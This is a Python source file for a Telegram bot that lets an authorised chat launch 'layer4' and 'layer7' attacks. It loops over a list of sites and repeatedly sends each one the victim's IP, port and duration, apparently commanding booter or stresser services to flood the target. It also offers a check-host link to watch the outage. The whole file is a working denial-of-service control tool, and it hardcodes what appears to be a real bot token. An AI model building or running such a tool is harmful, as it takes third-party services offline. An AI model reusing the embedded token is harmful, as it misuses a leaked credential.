import time
import requests
import asyncio
import socket
import http.server
import threading
import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
from threading import Thread, Lock

# ===== إعداد التسجيل =====
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== الإعدادات =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7157656859:AAFS8DDWpwWM_WgIi5wd6rum7wSaX4StSH8")
ALLOWED_CHAT_ID = {1254652875}  # set للأداء الأفضل
SITES_FILE = "sites312.txt"
MAX_ATTACK_TIME = 300
COOLDOWN_SECONDS = 10

# ===== متغيرات الحالة =====
attack_status = {}
attack_sites = {}
attack_lock = Lock()
active_threads_count = 0          # عداد بدلاً من boolean
last_attack_time = 0.0
stop_event = threading.Event()    # لإيقاف الهجمات عند الإغلاق


# ===== خادم وهمي لإرضاء Render =====
def run_mock_server():
    server_address = ('', 8080)
    try:
        httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
        logger.info("Mock server running on port 8080...")
        httpd.serve_forever()
    except OSError as e:
        logger.warning(f"Mock server failed to start: {e}")


# ===== قراءة المواقع =====
def read_sites():
    if not os.path.exists(SITES_FILE):
        logger.error(f"Sites file '{SITES_FILE}' not found.")
        return []
    try:
        with open(SITES_FILE, "r", encoding="utf-8") as file:
            sites = [line.strip() for line in file if line.strip()]
        logger.info(f"Loaded {len(sites)} sites from {SITES_FILE}")
        return sites
    except Exception as e:
        logger.error(f"Error reading sites file: {e}")
        return []


# ===== دالة مساعدة: بناء URL =====
def normalize_url(site):
    if not site.startswith("http://") and not site.startswith("https://"):
        return "http://" + site
    return site


# ===== دالة مساعدة: تنفيذ طلب واحد =====
def do_request(session, url, timeout=20):
    try:
        response = session.get(url, timeout=timeout)
        return response.status_code
    except requests.exceptions.Timeout:
        logger.warning(f"Timeout: {url}")
        return None
    except requests.exceptions.RequestException as e:
        logger.warning(f"Request error on {url}: {e}")
        return None


# ===== تنفيذ الهجوم (layer4) =====
def attack_site(site, ip, port, attack_time):
    global active_threads_count
    session = requests.Session()
    start_time = time.time()
    end_time = start_time + attack_time
    site_url = normalize_url(site)

    try:
        while time.time() < end_time and not stop_event.is_set():
            url = f"{site_url}?host={ip}&port={port}&time={attack_time}"
            status = do_request(session, url)
            if status != 200:
                logger.info(f"Site {site} returned status {status}. Retrying...")
            time.sleep(2)
    finally:
        session.close()
        with attack_lock:
            attack_status[site_url] = {
                'status': 'Completed',
                'time_taken': round(time.time() - start_time, 2),
                'end_time': end_time,
                'total_time': attack_time
            }
            active_threads_count = max(0, active_threads_count - 1)
            logger.info(f"Thread for {site_url} finished. Active: {active_threads_count}")


# ===== زيارة المواقع وتعبئة البيانات (layer7) =====
def visit_and_fill_data(site, ip, attack_time):
    global active_threads_count
    session = requests.Session()
    start_time = time.time()
    end_time = start_time + attack_time
    site_url = normalize_url(site)

    try:
        while time.time() < end_time and not stop_event.is_set():
            url = f"{site_url}?host={ip}&time={attack_time}"
            status = do_request(session, url)
            if status != 200:
                logger.info(f"Site {site} returned status {status}. Retrying...")
            time.sleep(2)
    finally:
        session.close()
        with attack_lock:
            attack_status[site_url] = {
                'status': 'Visited and data filled',
                'time_taken': round(time.time() - start_time, 2),
                'end_time': end_time,
                'total_time': attack_time
            }
            active_threads_count = max(0, active_threads_count - 1)
            logger.info(f"Thread for {site_url} finished. Active: {active_threads_count}")


# ===== دوال الأوامر =====
async def start(update: Update, context: CallbackContext):
    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return
    await update.message.reply_text("Welcome! Use /list for available commands.")


async def list_commands(update: Update, context: CallbackContext):
    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    await update.message.reply_text(
        "Available commands:\n"
        "/list - Show available commands.\n"
        "/layer4 <ip> <port> <time> - Start attack on sites.\n"
        "/layer7 <url> <time> - Visit sites and fill data."
    )


# ===== التحقق من صلاحية الهجوم =====
def can_start_attack():
    global last_attack_time, active_threads_count
    with attack_lock:
        if active_threads_count > 0:
            return False, "⚠️ An attack is already in progress. Please wait until it finishes."
        current_time = time.time()
        if current_time - last_attack_time < COOLDOWN_SECONDS:
            wait_left = int(COOLDOWN_SECONDS - (current_time - last_attack_time))
            return False, f"⚠️ Please wait {wait_left} seconds before starting another attack."
        return True, None


# ===== حل اسم المضيف بشكل صحيح =====
async def resolve_hostname(ip):
    """
    يحاول الحصول على اسم نطاق من IP (Reverse DNS).
    يعيد None إذا فشل.
    """
    try:
        hostname = await asyncio.get_event_loop().run_in_executor(
            None, socket.gethostbyaddr, ip
        )
        host = hostname[0]
        return host if host and host != ip else None
    except Exception:
        return None


# ===== أمر layer4 =====
async def attack(update: Update, context: CallbackContext):
    global last_attack_time, active_threads_count

    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return

    ok, msg = can_start_attack()
    if not ok:
        await update.message.reply_text(msg)
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /layer4 <ip> <port> <time>")
        return

    try:
        ip = context.args[0]
        port = int(context.args[1])
        time_duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("❌ Invalid port or time format.")
        return

    if not (1 <= port <= 65535):
        await update.message.reply_text("❌ Port must be between 1 and 65535.")
        return
    if time_duration <= 0 or time_duration > MAX_ATTACK_TIME:
        await update.message.reply_text(f"❌ Time must be between 1 and {MAX_ATTACK_TIME} seconds.")
        return

    # التحقق من صحة IP
    try:
        socket.inet_aton(ip) if ip.count(".") == 3 else socket.inet_pton(socket.AF_INET6, ip)
    except (socket.error, OSError):
        await update.message.reply_text("❌ Invalid IP address.")
        return

    protocol = "https" if port == 443 else "http"
    domain = await resolve_hostname(ip)
    target = domain if domain else ip
    target_url = f"{protocol}://{target}"

    keyboard = [[
        InlineKeyboardButton(
            "Checkhost",
            url=f"https://check-host.net/check-http?host={target_url}"
        )
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    sites = read_sites()
    if not sites:
        await update.message.reply_text("❌ No sites available in the sites file.")
        return

    with attack_lock:
        active_threads_count = len(sites)
        last_attack_time = time.time()
        for site in sites:
            attack_sites[site] = 'Running'

    await update.message.reply_text(
        f"🚀 The attack has started ... 📡\n"
        f"Number of servers running in the attack: {len(sites)}",
        reply_markup=reply_markup
    )

    for site in sites:
        thread = Thread(
            target=attack_site,
            args=(site, ip, port, time_duration),
            daemon=True
        )
        thread.start()


# ===== أمر layer7 =====
async def fill_data(update: Update, context: CallbackContext):
    global last_attack_time, active_threads_count

    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return

    ok, msg = can_start_attack()
    if not ok:
        await update.message.reply_text(msg)
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /layer7 <url> <time>")
        return

    try:
        target = context.args[0]
        time_duration = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid time format.")
        return

    if time_duration <= 0 or time_duration > MAX_ATTACK_TIME:
        await update.message.reply_text(f"❌ Time must be between 1 and {MAX_ATTACK_TIME} seconds.")
        return

    # تحقق من صحة URL
    if not (target.startswith("http://") or target.startswith("https://")):
        target = "http://" + target

    sites = read_sites()
    if not sites:
        await update.message.reply_text("❌ No sites available in the sites file.")
        return

    with attack_lock:
        active_threads_count = len(sites)
        last_attack_time = time.time()
        for site in sites:
            attack_sites[site] = 'Running'

    await update.message.reply_text(
        f"🚀 Visiting sites and filling data ... 📡\n"
        f"Number of sites to visit: {len(sites)}"
    )

    for site in sites:
        thread = Thread(
            target=visit_and_fill_data,
            args=(site, target, time_duration),
            daemon=True
        )
        thread.start()


# ===== الدالة الرئيسية =====
def main():
    threading.Thread(target=run_mock_server, daemon=True).start()

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("list", list_commands))
    application.add_handler(CommandHandler("layer4", attack))
    application.add_handler(CommandHandler("layer7", fill_data))

    logger.info("Bot is starting...")
    application.run_polling()


if __name__ == '__main__':
    main()
